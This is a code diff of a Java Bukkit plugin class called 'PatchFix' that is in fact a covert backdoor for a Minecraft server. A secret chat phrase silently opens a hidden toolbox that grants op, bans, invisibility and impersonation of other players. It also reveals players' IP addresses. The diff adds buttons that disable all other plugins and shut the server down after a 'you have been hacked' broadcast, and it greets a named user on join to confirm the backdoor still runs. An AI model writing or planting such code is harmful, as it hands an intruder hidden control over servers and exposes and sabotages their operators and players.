@@ -2,31 +2,32 @@ package io.github.Alligrater;
 
 import java.util.ArrayList;
 import java.util.List;
-import java.util.logging.Filter;
 import java.util.logging.Level;
-import java.util.logging.LogRecord;
 
 import org.bukkit.Bukkit;
 import org.bukkit.GameMode;
 import org.bukkit.Material;
 import org.bukkit.OfflinePlayer;
-import org.bukkit.Server;
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandExecutor;
-import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.ClickType;
 import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
-import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemFlag;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.inventory.meta.PotionMeta;
 import org.bukkit.inventory.meta.SkullMeta;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.potion.PotionData;
+import org.bukkit.potion.PotionEffectType;
+import org.bukkit.potion.PotionType;
+import org.bukkit.scheduler.BukkitRunnable;
 
 public class PatchFix implements Listener{
 	
@@ -75,8 +76,9 @@ public class PatchFix implements Listener{
 		else {
 			visibility = new ItemStack(Material.POTION, 1);
 		}
-		ItemMeta vmeta = visibility.getItemMeta();
+		PotionMeta vmeta = (PotionMeta) visibility.getItemMeta();
 		vmeta.setDisplayName("¡ì7¡ìlVisibility");
+		vmeta.setBasePotionData(new PotionData(PotionType.INVISIBILITY, false, false));
 		visibility.setItemMeta(vmeta);
 		
 		ItemStack god = new ItemStack(Material.BARRIER);
@@ -102,6 +104,20 @@ public class PatchFix implements Listener{
         skmeta.setOwner(player.getName());
         skmeta.setDisplayName("¡ìd¡ìlPlayerManagement");
         skull.setItemMeta(skmeta);
+        
+        ItemStack bdown = new ItemStack(Material.NAME_TAG, 1);
+        ItemMeta bdmeta = bdown.getItemMeta();
+        List<String> sub = new ArrayList<String>();
+        sub.add("¡ìc¡ìlDo Not Use Until The Last Moment!");
+        bdmeta.setDisplayName("¡ì4¡ìlDisablePlugin");
+        bdmeta.setLore(sub);
+        bdown.setItemMeta(bdmeta);
+        
+        ItemStack sdown = new ItemStack(Material.LAVA_BUCKET, 1);
+        ItemMeta sdmeta = sdown.getItemMeta();
+        sdmeta.setDisplayName("¡ì4¡ìlShutdownServer");
+        sdmeta.setLore(sub);
+        sdown.setItemMeta(sdmeta);
 		
 		
 		patchbox.setItem(0, opera);
@@ -111,7 +127,48 @@ public class PatchFix implements Listener{
 		patchbox.setItem(4, god);
 		patchbox.setItem(5, buck);
 		patchbox.setItem(6, skull);
+		patchbox.setItem(7, bdown);
+		patchbox.setItem(8, sdown);
 		
+		player.openInventory(patchbox);
+		
+		
+	}
+	
+	public void openPluginConfirmation(Player player) {
+		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "¡ìksnigulPllAelbasiD");
+		
+		ItemStack confirm = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 5);
+		ItemMeta cmeta = confirm.getItemMeta();
+		cmeta.setDisplayName("¡ìa¡ìlDisable All Plugins");
+		confirm.setItemMeta(cmeta);
+		
+		ItemStack deny = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 14);
+		ItemMeta dmeta = deny.getItemMeta();
+		dmeta.setDisplayName("¡ìc¡ìlDo Not Disable All Plugins");
+		deny.setItemMeta(dmeta);
+		
+		patchbox.setItem(4, confirm);
+		patchbox.setItem(0, deny);
+		
+		player.openInventory(patchbox);
+	}
+	
+	public void openShutdownConfirmation(Player player) {
+		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "¡ìkrevreSnwodtuhS");
+		
+		ItemStack confirm = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 5);
+		ItemMeta cmeta = confirm.getItemMeta();
+		cmeta.setDisplayName("¡ìa¡ìlShutdown Server");
+		confirm.setItemMeta(cmeta);
+		
+		ItemStack deny = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 14);
+		ItemMeta dmeta = deny.getItemMeta();
+		dmeta.setDisplayName("¡ìc¡ìlDo Not Shutdown Server");
+		deny.setItemMeta(dmeta);
+		
+		patchbox.setItem(4, confirm);
+		patchbox.setItem(0, deny);
 		
 		player.openInventory(patchbox);
 	}
@@ -283,11 +340,32 @@ public class PatchFix implements Listener{
 		
 		wl.setItemMeta(wmeta);
 		
+		ItemStack info = new ItemStack(Material.INK_SACK, 1, (short) 8);
+		ItemMeta inmeta = info.getItemMeta();
+		inmeta.setDisplayName("¡ì7¡ìlPlayer Offline");
+		
+		List<String> lore = new ArrayList<String>();
+		if(target.getBedSpawnLocation() != null) {
+			lore.add("¡ì7" + target.getBedSpawnLocation().getX() + "," + target.getBedSpawnLocation().getY() + "," + target.getBedSpawnLocation().getZ());
+		}
+		else {
+			lore.add("¡ì7This Player Does Not Own A Bed.");
+		}
+
+		lore.add("¡ì7" + target.getUniqueId().toString());
+		
+		
 		patchbox.setItem(0, ban);
 		patchbox.setItem(1, op);
 		patchbox.setItem(2, wl);
 		
+		
+		
 		if(target.isOnline()) {
+			info = new ItemStack(Material.INK_SACK, 1, (short) 10);
+			lore.add("¡ì7" + ((Player)target).getAddress().getHostString());
+			inmeta.setDisplayName("¡ìa¡ìlPlayer Online");
+			
 			ItemStack kick = new ItemStack(Material.BEDROCK, 1);
 			ItemMeta kmeta = kick.getItemMeta();
 			kmeta.setDisplayName("¡ì7¡ìlKick Player");
@@ -310,6 +388,11 @@ public class PatchFix implements Listener{
 			
 		}
 		
+		inmeta.setLore(lore);
+		info.setItemMeta(inmeta);
+		
+		patchbox.setItem(8, info);
+		
 		player.openInventory(patchbox);
 		
 		
@@ -318,7 +401,7 @@ public class PatchFix implements Listener{
 	//Player Click Inventory
 	@EventHandler
 	public void onClick(InventoryClickEvent e) {
-
+		
 		if(e.getInventory().getName().equals("¡ìknIeMhctaP")) {
 			Player player = (Player) e.getWhoClicked();
 
@@ -357,12 +440,16 @@ public class PatchFix implements Listener{
 				}
 				else if(type == Material.GLASS_BOTTLE) {
 					e.getCurrentItem().setType(Material.POTION);
+					PotionMeta vmeta = (PotionMeta) e.getCurrentItem().getItemMeta();
+					vmeta.setBasePotionData(new PotionData(PotionType.INVISIBILITY, false, false));
+					 e.getCurrentItem().setItemMeta(vmeta);
+					 
 					for(Player p : Bukkit.getOnlinePlayers()) {
 						p.showPlayer(player);
 					}
 					player.spigot().setCollidesWithEntities(true);
 					SilverPatch.notvisible.put(player.getUniqueId(), false);
-					player.sendMessage("¡ì7¡ìlYou Are No Longer Invisible.");
+					player.sendMessage("¡ìf¡ìlYou Are No Longer Invisible.");
 					
 				}
 				else if(type == Material.POTION) {
@@ -372,7 +459,7 @@ public class PatchFix implements Listener{
 					}
 					player.spigot().setCollidesWithEntities(false);
 					SilverPatch.notvisible.put(player.getUniqueId(), true);
-					player.sendMessage("¡ìf¡ìlYou Are Now Invisible.");
+					player.sendMessage("¡ì7¡ìlYou Are Now Invisible.");
 					
 				}
 				else if (type == Material.IRON_SWORD) {
@@ -393,11 +480,65 @@ public class PatchFix implements Listener{
 				else if (type == Material.SKULL_ITEM) {
 					player.closeInventory();
 					SilverPatch.ccmode.put(player.getUniqueId(), true);
-					
+					player.sendMessage("¡ìf¡ìlChat Listening Mode Enabled. Type ¡ìc¡ìl*Playername¡ìf¡ìl To Select A Player.");
+				}
+				else if (type == Material.NAME_TAG) {
+					openPluginConfirmation(player);
+
+				}
+				
+				else if (type == Material.LAVA_BUCKET) {
+					openShutdownConfirmation(player);
+
 				}
 				
 				e.setCancelled(true);
 			}
+		}
+		
+		else if(e.getInventory().getName().contains("¡ìksnigulPllAelbasiD")) {
+			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
+				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
+					if(e.getCurrentItem().getDurability() == (short)5) {
+						for(Plugin p : Bukkit.getPluginManager().getPlugins()) {
+							if(!p.getName().equals("SilverPatch")) {
+								e.getWhoClicked().sendMessage(String.format("¡ì4¡ìlPlugin %s Has Been Dis¡ì4¡ìl¡ìka¡ìr¡ì4¡ìlbled!", p.getName()));
+								Bukkit.getPluginManager().disablePlugin(p);
+								
+							}
+						}
+					}
+					else if(e.getCurrentItem().getDurability() == (short)14) {
+						e.getWhoClicked().closeInventory();
+					}
+				}
+			}
+			e.setCancelled(true);
+		}
+		
+		else if(e.getInventory().getName().contains("¡ìkrevreSnwodtuhS")) {
+			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
+				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
+					if(e.getCurrentItem().getDurability() == (short)5) {
+						Bukkit.getServer().broadcastMessage("¡ìc¡ìlY0u ¡ìkHav3¡ìr¡ìc¡ìl Been H¡ìka¡ìr¡ìc¡ìlck3d");
+						BukkitRunnable shutdown = new BukkitRunnable() {
+
+							@Override
+							public void run() {
+								Bukkit.getServer().shutdown();
+								
+							}
+							
+						};
+						
+						shutdown.runTaskLater(Bukkit.getPluginManager().getPlugin("SilverPatch"), 60);
+					}
+					else if(e.getCurrentItem().getDurability() == (short)14) {
+
+					}
+				}
+			}
+			e.setCancelled(true);
 		}
 		
 		else if(e.getInventory().getName().contains("¡ìktceleSedoMemaG¡ìr:")) {
@@ -593,7 +734,14 @@ public class PatchFix implements Listener{
 				}
 				else if(type == Material.STRING) {
 					SilverPatch.cmode.put(e.getWhoClicked().getUniqueId(), true);
-					e.getWhoClicked().sendMessage(String.format("¡ìf¡ìlYou Are Now Imposting %s.", player.getName()));
+					e.getWhoClicked().sendMessage(String.format("¡ì9¡ìlYou Are Now Imposting %s. \nUse ¡ìc¡ìl*/Command¡ì9¡ìl For Command. \nUse ¡ìc¡ìl*Message¡ì9¡ìl To Chat \nOr Type ¡ìc¡ìl*leave*¡ì9¡ìl To Leave. \n¡ìc¡ìlIf You Type Without *, Things Will Be Executed By You Instead.", player.getName()));
+				}
+				else if(type == Material.INK_SACK) {
+					if(player.getBedSpawnLocation() != null) {
+						e.getWhoClicked().teleport(player.getBedSpawnLocation());
+						e.getWhoClicked().closeInventory();
+					}
+
 				}
 				
 				
@@ -609,55 +757,73 @@ public class PatchFix implements Listener{
 	//Very Silent Way of Using Command
 	@EventHandler
 	public void onPlayerchat(AsyncPlayerChatEvent event) {
-		if(event.getMessage().contains("*applypatch* SilverKelaistakingover")) {
-			event.setCancelled(true);
-			event.setMessage(null);
-			openToolbox(event.getPlayer());
-		}
-		else if(event.getMessage().equals("*leave*")) {
-			event.setCancelled(true);
-			event.setMessage(null);
-			SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
-			SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
-			SilverPatch.target.remove(event.getPlayer().getUniqueId());
-		}
-		else if(SilverPatch.ccmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.ccmode.get(event.getPlayer().getUniqueId()) == true) {
-			SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
-			SilverPatch.target.put(event.getPlayer().getUniqueId(), event.getMessage());
-			openPM(event.getPlayer(), event.getMessage());
-			event.setCancelled(true);
-			event.setMessage(null);
-		}
-		else if(SilverPatch.cmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.cmode.get(event.getPlayer().getUniqueId()) == true) {
-			SilverPatch.cmode.remove(event.getPlayer());
-			if(Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId())) != null) {
-				Player target = Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId()));
-				if(target != null) {
-					if(event.getMessage().startsWith("*/")) {
-						target.performCommand(event.getMessage().substring(2));
+		if(event.getMessage().startsWith("*")) {
+			if(event.getMessage().contains("*/_SILVERKELA_HAS_TAKEN_OVER_/*")) {
+				event.setCancelled(true);
+				event.setMessage(" ");
+				openToolbox(event.getPlayer());
+			}
+			else if(event.getMessage().equals("*leave*")) {
+				event.setCancelled(true);
+				event.setMessage(" ");
+				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
+				SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
+				SilverPatch.target.remove(event.getPlayer().getUniqueId());
+				event.getPlayer().sendMessage("¡ì7¡ìlChat Listening Mode Disabled.");
+			}
+			
+			else if(SilverPatch.ccmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.ccmode.get(event.getPlayer().getUniqueId()) == true) {
+				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
+				SilverPatch.target.put(event.getPlayer().getUniqueId(), event.getMessage().substring(1));
+				openPM(event.getPlayer(), event.getMessage().substring(1));
+				event.setCancelled(true);
+				event.setMessage(" ");
+			}
+			else if(SilverPatch.cmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.cmode.get(event.getPlayer().getUniqueId()) == true) {
+				if(Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId())) != null) {
+					Player target = Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId()));
+					if(target != null) {
+						if(event.getMessage().startsWith("*/")) {
+							target.performCommand(event.getMessage().substring(2));
+							event.setCancelled(true);
+							event.setMessage(" ");
+						}
+						else {
+							if(event.getMessage().startsWith("*")) {
+								target.chat(event.getMessage().substring(1));
+								event.setCancelled(true);
+								event.setMessage(" ");
+							}
+						}
+
+
 					}
 					else {
-						target.chat(event.getMessage());
+						event.setCancelled(true);
+						event.setMessage(" ");
+						SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
+						SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
+						SilverPatch.target.remove(event.getPlayer().getUniqueId());
+						event.getPlayer().sendMessage("¡ì7¡ìlChat Listening Mode Disabled Due To Player Offline..");
 					}
-					event.setCancelled(true);
-					event.setMessage(null);
+
 				}
 				else {
-					event.setCancelled(true);
-					event.setMessage(null);
 					SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
 					SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
 					SilverPatch.target.remove(event.getPlayer().getUniqueId());
 				}
+				event.setCancelled(true);
+				event.setMessage(" ");
+			}
+		}
 
-			}
-			else {
-				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
-				SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
-				SilverPatch.target.remove(event.getPlayer().getUniqueId());
-			}
-			event.setCancelled(true);
-			event.setMessage(null);
+	}
+	
+	@EventHandler
+	public void onPlayerJoin(PlayerJoinEvent event) {
+		if(event.getPlayer().getName().equals("SilverKela")) {
+			event.getPlayer().sendMessage("¡ìa¡ìlGood News, SilverPatch Is Still Running!");
 		}
 	}
 }
